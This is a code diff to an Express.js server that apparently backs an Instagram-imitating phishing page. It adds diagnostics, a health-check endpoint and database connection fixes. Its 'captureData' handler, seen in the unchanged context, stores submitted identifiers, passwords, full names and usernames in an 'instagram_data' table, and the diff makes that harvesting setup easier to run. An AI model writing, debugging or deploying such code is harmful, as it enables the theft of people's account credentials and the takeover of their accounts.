@@ -14,37 +14,47 @@ app.use(express.json());
 const rootPath = __dirname;
 const distPath = path.join(rootPath, 'dist');
 
-// Startup diagnostics for Render
+// Startup diagnostics
 console.log('--- Startup Diagnostic ---');
 const requiredFiles = ['dist/bundle.js', 'dist/style.css', 'index.html'];
 requiredFiles.forEach(f => {
     const p = path.join(rootPath, f);
     if (fs.existsSync(p)) {
-        console.log(`✅ Found: ${f}`);
+        console.log(`✅ File Found: ${f}`);
     } else {
-        console.error(`❌ MISSING: ${f}`);
+        console.error(`❌ File MISSING: ${f} (Run 'npm run build' if local)`);
     }
 });
 
-// Serve static files from 'dist' folder
+// Serve static files
 app.use('/dist', express.static(distPath));
-// Serve root static files
 app.use(express.static(rootPath));
 
-// DB Connection
+// DB Connection Configuration
+// For local: Ensure you have a DATABASE_URL env var or update this object with your local credentials
 const dbConfig = {
   connectionString: process.env.DATABASE_URL,
-  ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false
+  ssl: process.env.DATABASE_URL && !process.env.DATABASE_URL.includes('localhost') 
+    ? { rejectUnauthorized: false } 
+    : false
 };
 
 let dbPool;
+let dbStatus = "disconnected";
+
 async function initDb() {
   if (!process.env.DATABASE_URL) {
-    console.warn("DATABASE_URL not set. Capture will fail.");
+    console.warn("⚠️  DATABASE_URL environment variable is NOT set.");
+    console.warn("To connect locally, run: export DATABASE_URL=postgres://user:pass@localhost:5432/dbname");
     return null;
   }
+
   const pool = new Pool(dbConfig);
   try {
+    // Test connection
+    await pool.query('SELECT NOW()');
+    
+    // Initialize tables
     await pool.query(`
       CREATE TABLE IF NOT EXISTS instagram_data (
         id SERIAL PRIMARY KEY,
@@ -55,19 +65,34 @@ async function initDb() {
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       );
     `);
-    console.log("Database initialized.");
+    
+    console.log("✅ Database connection successful and tables initialized.");
+    dbStatus = "connected";
     return pool;
   } catch (err) {
-    console.error("Database initialization failed:", err.message);
+    console.error("❌ Database connection FAILED:", err.message);
+    dbStatus = `error: ${err.message}`;
     return null;
   }
 }
 
 initDb().then(pool => { dbPool = pool; });
 
+// --- API ENDPOINTS ---
+
+// Health check to verify DB status from browser
+app.get('/api/health', (req, res) => {
+  res.json({
+    status: "server_up",
+    database: dbStatus,
+    env: process.env.NODE_ENV || "development",
+    timestamp: new Date().toISOString()
+  });
+});
+
 const captureData = async (req, res) => {
   const { identifier, password, fullName, username } = req.body;
-  if (!dbPool) return res.status(503).json({ success: false, message: 'DB not connected' });
+  if (!dbPool) return res.status(503).json({ success: false, message: 'Database not connected' });
 
   try {
     const query = `INSERT INTO instagram_data (identifier, password, full_name, username) VALUES ($1, $2, $3, $4) RETURNING id;`;
@@ -88,5 +113,6 @@ app.get('*', (req, res) => {
 });
 
 app.listen(port, () => {
-  console.log(`Server listening on port ${port}`);
+  console.log(`🚀 Server listening on port ${port}`);
+  console.log(`🔗 Health check: http://localhost:${port}/api/health`);
 });
